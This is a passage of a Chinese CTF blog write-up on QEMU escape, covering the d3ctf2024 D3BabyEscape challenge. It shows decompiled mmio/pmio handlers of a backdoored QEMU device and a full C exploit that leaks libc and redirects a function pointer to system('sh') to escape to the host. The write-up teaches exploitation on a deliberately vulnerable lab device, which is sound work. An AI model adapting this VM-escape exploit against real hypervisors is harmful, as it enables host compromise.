[rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  _QWORD n_4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****dev; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  n_4[<span class="number">2</span>] = a1;</span><br><span class="line">  n_4[<span class="number">1</span>] = addr;</span><br><span class="line">  n_4[<span class="number">0</span>] = val;</span><br><span class="line">  len = a4;</span><br><span class="line">  dev = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0x85</span>u, (__int64)<span class="string">&quot;l0dev_mmio_write&quot;</span>);</span><br><span class="line">  v9 = (<span class="type">unsigned</span> __int64)addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  result = addr;</span><br><span class="line">  v7 = (<span class="type">unsigned</span> <span class="type">int</span>)addr;</span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">const</span> <span class="type">char</span> ****)(<span class="number">8</span> * v9 + len);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">64</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = n_4[<span class="number">0</span>];</span><br><span class="line">        v7 = ((<span class="type">int</span> (__fastcall *)(_QWORD *))dev[<span class="number">425</span>])(n_4) % <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> ****)<span class="built_in">memcpy</span>((<span class="type">char</span> *)dev + v7 + <span class="number">3124</span>, n_4, len);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">128</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">const</span> <span class="type">char</span> ****)n_4[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( n_4[<span class="number">0</span>] &lt;= <span class="number">0x100</span>uLL )</span><br><span class="line">        &#123;</span><br><span class="line">          result = dev;</span><br><span class="line">          *((_DWORD *)dev + <span class="number">640</span>) = n_4[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> ****)<span class="built_in">memcpy</span>((<span class="type">char</span> *)dev + v7 + <span class="number">3124</span>, n_4, len);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>128分支能够修改dev[640],内存越界读已经找到</p>
<p>64分支存在函数调用,参数为指向val的指针</p>
<p>pmio_read</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_480A92</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0x68</span>u, (__int64)<span class="string">&quot;l0dev_pmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  v7 = a2 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * v7 + a3 &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">char</span> *)v6 + (<span class="type">unsigned</span> <span class="type">int</span>)a2 + <span class="number">3124</span>, a3);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)dest == <span class="number">666</span> )</span><br><span class="line">    ++backdoor;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>似乎存在一个后门开启</p>
<p>pmio_write</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_480CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">unsigned</span> __int64 a2, __int64 a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = a3;</span><br><span class="line">  n[<span class="number">0</span>] = a4;</span><br><span class="line">  v9 = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0xAD</span>u, (__int64)<span class="string">&quot;l0dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( backdoor )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">char</span> *)v9 + (<span class="type">unsigned</span> <span class="type">int</span>)(*((_DWORD *)v9 + <span class="number">640</span>) + v6) + <span class="number">3124</span>, &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">  result = (<span class="type">void</span> *)(v6 &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  v10 = v6 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n[<span class="number">0</span>] &lt;= <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * v10 + n[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v6;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">char</span> *)v9 + (<span class="type">unsigned</span> <span class="type">int</span>)v6 + <span class="number">3124</span>, &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>果然发现了后门,越界写也已经找到了,那接下来就是泄露libc,然后劫持执行流,跟上一题差不多就不多说了</p>
<p><strong>exp</strong>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* mmio;</span><br><span class="line"><span class="type">uint32_t</span> port_base = <span class="number">0xc000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line">        outl(val, port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">        *(<span class="type">uint64_t</span>*)(mmio + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">uint64_t</span>*)(mmio + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;I/O permission is not enough\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mmio_fd =</span><br><span class="line">        open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    mmio = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">uint64_t</span> u64cmd;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* cmd = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line">        <span class="built_in">strcpy</span>(&amp;u64cmd, cmd); </span><br><span class="line"></span><br><span class="line">        mmio_write(<span class="number">0</span>, <span class="number">666</span>);</span><br><span class="line">        <span class="type">uint32_t</span> num = pmio_read(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        mmio_write(<span class="number">0x80</span>, <span class="number">0x100</span>);</span><br><span class="line">        <span class="type">uint64_t</span> libc_base = mmio_read(<span class="number">0x14</span>) - <span class="number">0x1e780</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;libc_base:\t0x%llx\n&quot;</span>, libc_base);</span><br><span class="line">        <span class="keyword">if</span> (libc_base == <span class="number">0</span> || (libc_base &amp; <span class="number">0xFFF</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint64_t</span> system_addr = libc_base + <span class="number">0x28d70</span>;</span><br><span class="line">        pmio_write(<span class="number">0x14</span>, system_addr &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">        pmio_write(<span class="number">0x18</span>, system_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">        mmio_write(<span class="number">0x40</span>, u64cmd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>qemu-escape初识</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://ixout.github.io/posts/28098/">https://ixout.github.io/posts/28098/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>ixout</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2024-04-18</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-11-20</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/qemu-escape/">qemu-escape</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/1ccabf1b.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/36820/" title="强网杯2023两道题"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/p45347545154796.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">强网杯2023两道题</div></div></a></div><div class="next-post pull-right"><a href="/posts/57890/" title="西湖论剑babywin复现"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/c9d3deb2ca2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">西湖论剑babywin复现</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>Author</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">十八线业余选手</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="fa-brands fa-github"></i></a><a class="social-icon" href="/1425430423" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">51</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">56</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">5</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#qemu"><span class="toc-number">1.</span> <span class="toc-text">qemu</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text">内存模型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">内存布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GUEST%E8%A7%86%E8%A7%92"><span class="toc-number">1.1.2.</span> <span class="toc-text">GUEST视角</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MemoryRegion"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">MemoryRegion</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FlatView"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">FlatView</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AddressSpace"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">AddressSpace</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HOST%E8%A7%86%E8%A7%92"><span class="toc-number">1.1.3.</span> <span class="toc-text">HOST视角</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RAMBlock"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">RAMBlock</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">设备模型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IO%E5%A4%84%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">IO处理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MMIO"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">MMIO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PMIO"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">PMIO</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pci%E8%AE%BE%E5%A4%87%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4"><span class="toc-number">1.3.</span> <span class="toc-text">pci设备地址空间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E4%B8%AD%E6%9F%A5%E7%9C%8Bpci%E8%AE%BE%E5%A4%87"><span class="toc-number">1.4.</span> <span class="toc-text">qemu中查看pci设备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E4%B8%AD%E8%AE%BF%E9%97%AEI-O%E7%A9%BA%E9%97%B4"><span class="toc-number">1.5.</span> <span class="toc-text">qemu中访问I&#x2F;O空间</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEmmio"><span class="toc-number">1.5.1.</span> <span class="toc-text">访问mmio</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEpmio"><span class="toc-number">1.5.2.</span> <span class="toc-text">访问pmio</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QOM%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.6.</span> <span class="toc-text">QOM模型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TypeInfo-%E7%B1%BB%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%B1%9E%E6%80%A7"><span class="toc-number">1.6.1.</span> <span class="toc-text">TypeInfo - 类的基本属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Class-%E7%B1%BB%E7%9A%84%E9%9D%99%E6%80%81%E5%86%85%E5%AE%B9"><span class="toc-number">1.6.2.</span> <span class="toc-text">Class - 类的静态内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Object-%E7%B1%BB%E7%9A%84%E5%AE%9E%E4%BE%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.6.3.</span> <span class="toc-text">Object - 类的实例对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%88%9B%E5%BB%BA%E4%B8%8E%E9%87%8A%E6%94%BE"><span class="toc-number">1.6.4.</span> <span class="toc-text">类的创建与释放</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QOM%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.7.</span> <span class="toc-text">QOM实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Object%E4%B8%8EClass"><span class="toc-number">1.7.1.</span> <span class="toc-text">Object与Class</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmio-pmio%E8%AF%BB%E5%86%99%E5%87%BD%E6%95%B0"><span class="toc-number">1.7.2.</span> <span class="toc-text">mmio&#x2F;pmio读写函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E5%87%BD%E6%95%B0"><span class="toc-number">1.7.3.</span> <span class="toc-text">初始化函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C"><span class="toc-number">1.7.4.</span> <span class="toc-text">注册</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-number">1.7.5.</span> <span class="toc-text">编译</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#QEMU%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">QEMU逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BlizzardCTF2017-Strng"><span class="toc-number">2.1.</span> <span class="toc-text">BlizzardCTF2017 - Strng</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92"><span class="toc-number">2.1.3.</span> <span class="toc-text">交互</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.1.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d3ctf2024-D3BabyEscape"><span class="toc-number">2.2.</span> <span class="toc-text">d3ctf2024-D3BabyEscape</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>